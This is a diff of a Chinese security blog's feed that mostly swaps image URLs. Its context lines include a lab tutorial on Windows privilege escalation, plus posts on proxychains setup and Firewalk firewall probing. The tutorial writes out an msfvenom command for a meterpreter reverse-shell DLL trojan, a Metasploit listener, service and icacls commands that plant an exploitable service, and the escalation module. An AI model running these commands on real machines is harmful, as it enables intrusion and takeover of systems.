+<h4 id="2-然后调用工具-DllHijackAuditor-自动检测我们刚才下载的软件是否存在DLL-劫持，根据下图可以看到这里面存在一共-5-个DLL-文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！"><a href="#2-然后调用工具-DllHijackAuditor-自动检测我们刚才下载的软件是否存在DLL-劫持，根据下图可以看到这里面存在一共-5-个DLL-文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！" class="headerlink" title="2. 然后调用工具 DllHijackAuditor 自动检测我们刚才下载的软件是否存在DLL 劫持，根据下图可以看到这里面存在一共 5 个DLL  文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！"></a>2. 然后调用工具 <a href="https://securityxploded.com/getsoftware_direct.php?id=7777" target="_blank" rel="external">DllHijackAuditor</a> 自动检测我们刚才下载的软件是否存在DLL 劫持，根据下图可以看到这里面存在一共 5 个DLL  文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410223301_Bp44of_Screenshot.jpeg" alt=""></p>
 <h4 id="3-接下来我们利用msfvenom-生成文件名为ext-ms-win-kernel32-package-current-l1-1-0-dll-的-DLL-木马，用于进行DLL-劫持。"><a href="#3-接下来我们利用msfvenom-生成文件名为ext-ms-win-kernel32-package-current-l1-1-0-dll-的-DLL-木马，用于进行DLL-劫持。" class="headerlink" title="3. 接下来我们利用msfvenom 生成文件名为ext-ms-win-kernel32-package-current-l1-1-0.dll 的 DLL 木马，用于进行DLL 劫持。"></a>3. 接下来我们利用msfvenom 生成文件名为ext-ms-win-kernel32-package-current-l1-1-0.dll 的 DLL 木马，用于进行DLL 劫持。</h4><blockquote>
 <p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.175.143 lport=4444 -f dll -o /root/ext-ms-win-kernel32-package-current-l1-1-0.dll</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180410224504_LFKxXq_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410224504_LFKxXq_Screenshot.jpeg" alt=""></p>
 <h4 id="4-查看Windows-的环境变量，并将DLL-木马文件放入可控的环境变量中-这样当我们启动CCleaner-软件的时候就会调用我们的DLL-木马文件反弹shell"><a href="#4-查看Windows-的环境变量，并将DLL-木马文件放入可控的环境变量中-这样当我们启动CCleaner-软件的时候就会调用我们的DLL-木马文件反弹shell" class="headerlink" title="4. 查看Windows 的环境变量，并将DLL 木马文件放入可控的环境变量中,这样当我们启动CCleaner 软件的时候就会调用我们的DLL 木马文件反弹shell"></a>4. 查看Windows 的环境变量，并将DLL 木马文件放入可控的环境变量中,这样当我们启动CCleaner 软件的时候就会调用我们的DLL 木马文件反弹shell</h4><blockquote>
 <p>echo %path% </p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180410224735_dwsj0R_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410224735_dwsj0R_Screenshot.jpeg" alt=""></p>
 <h4 id="5-启动msf-的监听模式，默默等待用户执行软件，可以看到我们现在只是普通管理员权限"><a href="#5-启动msf-的监听模式，默默等待用户执行软件，可以看到我们现在只是普通管理员权限" class="headerlink" title="5. 启动msf 的监听模式，默默等待用户执行软件，可以看到我们现在只是普通管理员权限"></a>5. 启动msf 的监听模式，默默等待用户执行软件，可以看到我们现在只是普通管理员权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler </div><div class="line">msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</div><div class="line">payload =&gt; windows/meterpreter/reverse_tcp</div><div class="line">msf exploit(multi/handler) &gt; set lhost 192.168.175.143</div><div class="line">lhost =&gt; 192.168.175.143</div><div class="line">msf exploit(multi/handler) &gt; set lport 4444</div><div class="line">lport =&gt; 4444</div><div class="line">msf exploit(multi/handler) &gt; run</div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.175.143:4444</div></pre></td></tr></table></figure>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180410225355_mtdLaD_Screenshot.jpeg" alt=""></p>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180410225440_7mMEIN_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410225355_mtdLaD_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410225440_7mMEIN_Screenshot.jpeg" alt=""></p>
 <h4 id="6-从meterpreter-进入shell-模式，然后我们手动构建一个存在漏洞的服务，以便后续进行提权到-SYSTEM"><a href="#6-从meterpreter-进入shell-模式，然后我们手动构建一个存在漏洞的服务，以便后续进行提权到-SYSTEM" class="headerlink" title="6. 从meterpreter 进入shell 模式，然后我们手动构建一个存在漏洞的服务，以便后续进行提权到 SYSTEM"></a>6. 从meterpreter 进入shell 模式，然后我们手动构建一个存在漏洞的服务，以便后续进行提权到 SYSTEM</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sc create &quot;times0ng test&quot; binPath= &quot;C:\Program Files (x86)\times0ng test\just test\evil.exe&quot; start= auto</div><div class="line"></div><div class="line">cd C:\Program Files (x86)</div><div class="line"></div><div class="line">mkdir &quot;times0ng test\just test&quot;</div><div class="line"></div><div class="line">icacls &quot;C:\Program Files (x86)\times0ng test&quot; /grant Everyone:(OI)(CI)F /T</div></pre></td></tr></table></figure>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180410230219_rieB2E_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410230219_rieB2E_Screenshot.jpeg" alt=""></p>
 <h4 id="7-调用msf-的提权模块进行提权，可以看到我们很容易就取得了SYSTEM-权限"><a href="#7-调用msf-的提权模块进行提权，可以看到我们很容易就取得了SYSTEM-权限" class="headerlink" title="7. 调用msf 的提权模块进行提权，可以看到我们很容易就取得了SYSTEM 权限"></a>7. 调用msf 的提权模块进行提权，可以看到我们很容易就取得了SYSTEM 权限</h4><blockquote>
 <p>use exploit/windows/local/trusted_service_path</p>
 </blockquote>
@@ -398,10 +398,10 @@
     <link href="http://TimeS0ng.github.io/2018/03/30/kali-%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks-proxychains/"/>
     <id>http://TimeS0ng.github.io/2018/03/30/kali-代理之shadowsocks-proxychains/</id>
     <published>2018-03-30T09:14:16.000Z</published>
-    <updated>2018-03-30T09:15:40.739Z</updated>
+    <updated>2018-12-18T15:21:35.383Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-最近和朋友合租了一台vps-，我搭好ss-bbr-之后居然不知道如何给kali-配置代理，真是可耻，果然Mac-用惯了之后人都会变懒！找了很久发现好多关于kali-代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！"><a href="#emsp-emsp-最近和朋友合租了一台vps-，我搭好ss-bbr-之后居然不知道如何给kali-配置代理，真是可耻，果然Mac-用惯了之后人都会变懒！找了很久发现好多关于kali-代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！" class="headerlink" title="&emsp;&emsp;最近和朋友合租了一台vps ，我搭好ss + bbr 之后居然不知道如何给kali 配置代理，真是可耻，果然Mac 用惯了之后人都会变懒！找了很久发现好多关于kali 代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！"></a>&emsp;&emsp;最近和朋友合租了一台vps ，我搭好ss + bbr 之后居然不知道如何给kali 配置代理，真是可耻，果然Mac 用惯了之后人都会变懒！找了很久发现好多关于kali 代理的文章都失效，不过我还是在网上找到了<a href="https://blog.csdn.net/qq_27766969/article/details/71593611" target="_blank" rel="external">这篇文章</a>，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！</h4><a id="more"></a>
-<h2 id="0x01-代理流程"><a href="#0x01-代理流程" class="headerlink" title="0x01. 代理流程"></a>0x01. 代理流程</h2><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180330161820_C3BORx_Screenshot.jpeg" alt=""></p>
+<h2 id="0x01-代理流程"><a href="#0x01-代理流程" class="headerlink" title="0x01. 代理流程"></a>0x01. 代理流程</h2><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330161820_C3BORx_Screenshot.jpeg" alt=""></p>
 <h4 id="好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！"><a href="#好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！" class="headerlink" title="好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！"></a>好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！</h4><ul>
 <li>首先通过proxychains 将本地流量发往localhost 的 1080 端口</li>
 <li>localhost 的1080 端口和VPS 的8080 端口通过shadowsocks 建立 ss 连接</li>
@@ -410,7 +410,7 @@
 <h4 id="以上就是ss-代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置"><a href="#以上就是ss-代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置" class="headerlink" title="以上就是ss 代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置"></a>以上就是ss 代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置</h4><h2 id="0x02-配置-proxychains"><a href="#0x02-配置-proxychains" class="headerlink" title="0x02. 配置 proxychains"></a>0x02. 配置 proxychains</h2><blockquote>
 <p>vim /etc/proxychains.conf</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180330163334_xF5VwI_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330163334_xF5VwI_Screenshot.jpeg" alt=""></p>
 <h2 id="0x03-配置shadowsocks"><a href="#0x03-配置shadowsocks" class="headerlink" title="0x03. 配置shadowsocks"></a>0x03. 配置shadowsocks</h2><h4 id="1-安装shadowsocks"><a href="#1-安装shadowsocks" class="headerlink" title="1. 安装shadowsocks"></a>1. 安装shadowsocks</h4><blockquote>
 <p>apt-get install python-pip &amp;&amp; pip install shadowsocks</p>
 </blockquote>
@@ -426,15 +426,15 @@
 <h4 id="4-修改-python-配置文件，不然运行不了-ss"><a href="#4-修改-python-配置文件，不然运行不了-ss" class="headerlink" title="4. 修改 python 配置文件，不然运行不了 ss"></a>4. 修改 python 配置文件，不然运行不了 ss</h4><blockquote>
 <p>vim /usr/local/lib/python2.7/dist-packages/shadowsocks/crypto/openssl.py &emsp; # 修改成如下所示</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180330164846_7aMRN6_Screenshot.jpeg" alt=""></p>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180330165005_QFOnfG_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330164846_7aMRN6_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330165005_QFOnfG_Screenshot.jpeg" alt=""></p>
 <h4 id="5-现在可以启动-ss-使用代理，在要使用代理的应用前加proxychains-即可"><a href="#5-现在可以启动-ss-使用代理，在要使用代理的应用前加proxychains-即可" class="headerlink" title="5. 现在可以启动 ss 使用代理，在要使用代理的应用前加proxychains 即可"></a>5. 现在可以启动 ss 使用代理，在要使用代理的应用前加proxychains 即可</h4><blockquote>
 <p>sslocal -c /root/ss/ssserver.json -d start &emsp; # 重启之后需要再次运行该命令启动 ss</p>
 <p>proxychains curl ip.cn</p>
 <p>proxychains firefox</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180330165447_bwVCOz_Screenshot.jpeg" alt=""></p>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180330165823_L4SdgT_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330165447_bwVCOz_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330165823_L4SdgT_Screenshot.jpeg" alt=""></p>
 ]]></content>
     
     <summary type="html">
@@ -489,28 +489,27 @@
     <link href="http://TimeS0ng.github.io/2018/03/10/Firewalk-%E5%8E%9F%E7%90%86/"/>
     <id>http://TimeS0ng.github.io/2018/03/10/Firewalk-原理/</id>
     <published>2018-03-10T11:42:44.000Z</published>
-    <updated>2018-03-10T11:59:13.733Z</updated>
+    <updated>2018-12-18T15:15:51.593Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali-系列文章可能就要夭折了-o"><a href="#emsp-emsp-每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali-系列文章可能就要夭折了-o" class="headerlink" title="&emsp;&emsp;每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali 系列文章可能就要夭折了 \^o^"></a>&emsp;&emsp;每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali 系列文章可能就要夭折了 \^o^</h4><a id="more"></a>
-<p><img src="http://packetfactory.openwall.net/projects/firewalk/firewalk.gif" alt="image"></p>
-<h2 id="0x01-Firewalk-简介"><a href="#0x01-Firewalk-简介" class="headerlink" title="0x01. Firewalk 简介"></a>0x01. Firewalk 简介</h2><h4 id="emsp-emsp-Firewalk-是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP-UDP-配置的策略规则，因此在内网中使用-Firewalk-将是我们最理想的选择。"><a href="#emsp-emsp-Firewalk-是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP-UDP-配置的策略规则，因此在内网中使用-Firewalk-将是我们最理想的选择。" class="headerlink" title="&emsp;&emsp;Firewalk 是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP/UDP  配置的策略规则，因此在内网中使用 Firewalk 将是我们最理想的选择。"></a>&emsp;&emsp;Firewalk 是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP/UDP  配置的策略规则，因此在内网中使用 Firewalk 将是我们最理想的选择。</h4><h2 id="0x02-Firewalk-原理"><a href="#0x02-Firewalk-原理" class="headerlink" title="0x02. Firewalk 原理"></a>0x02. Firewalk 原理</h2><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180310171815_K8vVxh_Screenshot.jpeg" alt=""></p>
+<h2 id="0x01-Firewalk-简介"><a href="#0x01-Firewalk-简介" class="headerlink" title="0x01. Firewalk 简介"></a>0x01. Firewalk 简介</h2><h4 id="emsp-emsp-Firewalk-是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP-UDP-配置的策略规则，因此在内网中使用-Firewalk-将是我们最理想的选择。"><a href="#emsp-emsp-Firewalk-是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP-UDP-配置的策略规则，因此在内网中使用-Firewalk-将是我们最理想的选择。" class="headerlink" title="&emsp;&emsp;Firewalk 是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP/UDP  配置的策略规则，因此在内网中使用 Firewalk 将是我们最理想的选择。"></a>&emsp;&emsp;Firewalk 是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP/UDP  配置的策略规则，因此在内网中使用 Firewalk 将是我们最理想的选择。</h4><h2 id="0x02-Firewalk-原理"><a href="#0x02-Firewalk-原理" class="headerlink" title="0x02. Firewalk 原理"></a>0x02. Firewalk 原理</h2><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Firewalk%E5%8E%9F%E7%90%86/20180310171815_K8vVxh_Screenshot.jpeg" alt=""></p>
 <blockquote>
 <p>[*] Firewalk 主要是通过对 TTL 值的控制来达到探测目的的，下面介绍的原理理论上成立，但当我实际开防火墙测试时很多报文都会被防火墙过滤，但路由器测试毫无问题！</p>
 </blockquote>
-<h4 id="emsp-emsp-1-Firewalk-首先通过-PC-发送一个-TTL值为-1-的探测包到下一级-Gateway-的-33434-端口，如果-Gateway-接收到TTL-值为-1-的TCP-报文之后它会把TTL-减一变为-0，然后给-PC-回复一个-ICMP-报文，这样就能完成第一步的网络探测（当我测试防火墙的时候-TCP-报文被防火墙丢弃，便无法进行后续探测步骤）"><a href="#emsp-emsp-1-Firewalk-首先通过-PC-发送一个-TTL值为-1-的探测包到下一级-Gateway-的-33434-端口，如果-Gateway-接收到TTL-值为-1-的TCP-报文之后它会把TTL-减一变为-0，然后给-PC-回复一个-ICMP-报文，这样就能完成第一步的网络探测（当我测试防火墙的时候-TCP-报文被防火墙丢弃，便无法进行后续探测步骤）" class="headerlink" title="&emsp;&emsp;1. Firewalk 首先通过 PC 发送一个 TTL值为 1 的探测包到下一级 Gateway 的 33434 端口，如果 Gateway 接收到TTL 值为 1 的TCP 报文之后它会把TTL 减一变为 0，然后给 PC 回复一个 ICMP 报文，这样就能完成第一步的网络探测（当我测试防火墙的时候 TCP 报文被防火墙丢弃，便无法进行后续探测步骤）"></a>&emsp;&emsp;1. Firewalk 首先通过 PC 发送一个 TTL值为 1 的探测包到下一级 Gateway 的 33434 端口，如果 Gateway 接收到TTL 值为 1 的TCP 报文之后它会把TTL 减一变为 0，然后给 PC 回复一个 ICMP 报文，这样就能完成第一步的网络探测（当我测试防火墙的时候 TCP 报文被防火墙丢弃，便无法进行后续探测步骤）</h4><h4 id="emsp-emsp-2-探测完成之后PC-会发送TTL-为-2-的-TCP-UDP-包给Gateway-的不同端口，如果该端口没有被防火墙毙掉那么就能被-Gateway-转发到下一个节点，也就是图中的-firewall-，firewall-接到TTL-为1-的报文回复一个-ICMP-数据包，我们就能判断出-Gateway-被测的端口开放"><a href="#emsp-emsp-2-探测完成之后PC-会发送TTL-为-2-的-TCP-UDP-包给Gateway-的不同端口，如果该端口没有被防火墙毙掉那么就能被-Gateway-转发到下一个节点，也就是图中的-firewall-，firewall-接到TTL-为1-的报文回复一个-ICMP-数据包，我们就能判断出-Gateway-被测的端口开放" class="headerlink" title="&emsp;&emsp;2. 探测完成之后PC 会发送TTL 为 2 的 TCP/UDP 包给Gateway 的不同端口，如果该端口没有被防火墙毙掉那么就能被 Gateway 转发到下一个节点，也就是图中的 firewall ，firewall 接到TTL 为1 的报文回复一个 ICMP 数据包，我们就能判断出 Gateway 被测的端口开放"></a>&emsp;&emsp;2. 探测完成之后PC 会发送TTL 为 2 的 TCP/UDP 包给Gateway 的不同端口，如果该端口没有被防火墙毙掉那么就能被 Gateway 转发到下一个节点，也就是图中的 firewall ，firewall 接到TTL 为1 的报文回复一个 ICMP 数据包，我们就能判断出 Gateway 被测的端口开放</h4><h4 id="emsp-emsp-3-重复前两次操作测出内网中所有路由节点的策略规则"><a href="#emsp-emsp-3-重复前两次操作测出内网中所有路由节点的策略规则" class="headerlink" title="&emsp;&emsp;3. 重复前两次操作测出内网中所有路由节点的策略规则"></a>&emsp;&emsp;3. 重复前两次操作测出内网中所有路由节点的策略规则</h4><h2 id="0x03-Firewalk-实战"><a href="#0x03-Firewalk-实战" class="headerlink" title="0x03. Firewalk 实战"></a>0x03. Firewalk 实战</h2><h4 id="我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。"><a href="#我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。" class="headerlink" title="我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。"></a>我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。</h4><h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><h4 id="emsp-emsp-1-kali-emsp-IP-192-168-1-107"><a href="#emsp-emsp-1-kali-emsp-IP-192-168-1-107" class="headerlink" title="&emsp;&emsp;1. kali &emsp;IP=192.168.1.107"></a>&emsp;&emsp;1. kali &emsp;IP=192.168.1.107</h4><h4 id="emsp-emsp-2-gateway-emsp-IP-192-168-1-1-（vlan-开放53，80端口）"><a href="#emsp-emsp-2-gateway-emsp-IP-192-168-1-1-（vlan-开放53，80端口）" class="headerlink" title="&emsp;&emsp;2. gateway &emsp;IP=192.168.1.1 （vlan 开放53，80端口）"></a>&emsp;&emsp;2. gateway &emsp;IP=192.168.1.1 （vlan 开放53，80端口）</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180310191938_xHQroD_Screenshot.jpeg" alt=""></p>
+<h4 id="emsp-emsp-1-Firewalk-首先通过-PC-发送一个-TTL值为-1-的探测包到下一级-Gateway-的-33434-端口，如果-Gateway-接收到TTL-值为-1-的TCP-报文之后它会把TTL-减一变为-0，然后给-PC-回复一个-ICMP-报文，这样就能完成第一步的网络探测（当我测试防火墙的时候-TCP-报文被防火墙丢弃，便无法进行后续探测步骤）"><a href="#emsp-emsp-1-Firewalk-首先通过-PC-发送一个-TTL值为-1-的探测包到下一级-Gateway-的-33434-端口，如果-Gateway-接收到TTL-值为-1-的TCP-报文之后它会把TTL-减一变为-0，然后给-PC-回复一个-ICMP-报文，这样就能完成第一步的网络探测（当我测试防火墙的时候-TCP-报文被防火墙丢弃，便无法进行后续探测步骤）" class="headerlink" title="&emsp;&emsp;1. Firewalk 首先通过 PC 发送一个 TTL值为 1 的探测包到下一级 Gateway 的 33434 端口，如果 Gateway 接收到TTL 值为 1 的TCP 报文之后它会把TTL 减一变为 0，然后给 PC 回复一个 ICMP 报文，这样就能完成第一步的网络探测（当我测试防火墙的时候 TCP 报文被防火墙丢弃，便无法进行后续探测步骤）"></a>&emsp;&emsp;1. Firewalk 首先通过 PC 发送一个 TTL值为 1 的探测包到下一级 Gateway 的 33434 端口，如果 Gateway 接收到TTL 值为 1 的TCP 报文之后它会把TTL 减一变为 0，然后给 PC 回复一个 ICMP 报文，这样就能完成第一步的网络探测（当我测试防火墙的时候 TCP 报文被防火墙丢弃，便无法进行后续探测步骤）</h4><h4 id="emsp-emsp-2-探测完成之后PC-会发送TTL-为-2-的-TCP-UDP-包给Gateway-的不同端口，如果该端口没有被防火墙毙掉那么就能被-Gateway-转发到下一个节点，也就是图中的-firewall-，firewall-接到TTL-为1-的报文回复一个-ICMP-数据包，我们就能判断出-Gateway-被测的端口开放"><a href="#emsp-emsp-2-探测完成之后PC-会发送TTL-为-2-的-TCP-UDP-包给Gateway-的不同端口，如果该端口没有被防火墙毙掉那么就能被-Gateway-转发到下一个节点，也就是图中的-firewall-，firewall-接到TTL-为1-的报文回复一个-ICMP-数据包，我们就能判断出-Gateway-被测的端口开放" class="headerlink" title="&emsp;&emsp;2. 探测完成之后PC 会发送TTL 为 2 的 TCP/UDP 包给Gateway 的不同端口，如果该端口没有被防火墙毙掉那么就能被 Gateway 转发到下一个节点，也就是图中的 firewall ，firewall 接到TTL 为1 的报文回复一个 ICMP 数据包，我们就能判断出 Gateway 被测的端口开放"></a>&emsp;&emsp;2. 探测完成之后PC 会发送TTL 为 2 的 TCP/UDP 包给Gateway 的不同端口，如果该端口没有被防火墙毙掉那么就能被 Gateway 转发到下一个节点，也就是图中的 firewall ，firewall 接到TTL 为1 的报文回复一个 ICMP 数据包，我们就能判断出 Gateway 被测的端口开放</h4><h4 id="emsp-emsp-3-重复前两次操作测出内网中所有路由节点的策略规则"><a href="#emsp-emsp-3-重复前两次操作测出内网中所有路由节点的策略规则" class="headerlink" title="&emsp;&emsp;3. 重复前两次操作测出内网中所有路由节点的策略规则"></a>&emsp;&emsp;3. 重复前两次操作测出内网中所有路由节点的策略规则</h4><h2 id="0x03-Firewalk-实战"><a href="#0x03-Firewalk-实战" class="headerlink" title="0x03. Firewalk 实战"></a>0x03. Firewalk 实战</h2><h4 id="我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。"><a href="#我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。" class="headerlink" title="我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。"></a>我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。</h4><h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><h4 id="emsp-emsp-1-kali-emsp-IP-192-168-1-107"><a href="#emsp-emsp-1-kali-emsp-IP-192-168-1-107" class="headerlink" title="&emsp;&emsp;1. kali &emsp;IP=192.168.1.107"></a>&emsp;&emsp;1. kali &emsp;IP=192.168.1.107</h4><h4 id="emsp-emsp-2-gateway-emsp-IP-192-168-1-1-（vlan-开放53，80端口）"><a href="#emsp-emsp-2-gateway-emsp-IP-192-168-1-1-（vlan-开放53，80端口）" class="headerlink" title="&emsp;&emsp;2. gateway &emsp;IP=192.168.1.1 （vlan 开放53，80端口）"></a>&emsp;&emsp;2. gateway &emsp;IP=192.168.1.1 （vlan 开放53，80端口）</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Firewalk%E5%8E%9F%E7%90%86/20180310191938_xHQroD_Screenshot.jpeg" alt=""></p>
 <h4 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h4><blockquote>
 <ol>
 <li>首先配置路由器规则</li>
 </ol>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180310192546_EDr687_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Firewalk%E5%8E%9F%E7%90%86/20180310192546_EDr687_Screenshot.jpeg" alt=""></p>
 <blockquote>
 <ol>
 <li>启动 firewalk 进行探察（ 参数都很简单，不懂的可以通过 man 手册自行查看 ）</li>
 </ol>
 <p>firewalk -S21,22,53,80,139,445 -i eth0 -n -pTCP 192.168.1.1 8.8.8.8</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180310192754_kdeWFt_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Firewalk%E5%8E%9F%E7%90%86/20180310192754_kdeWFt_Screenshot.jpeg" alt=""></p>
 <blockquote>
 <ol>
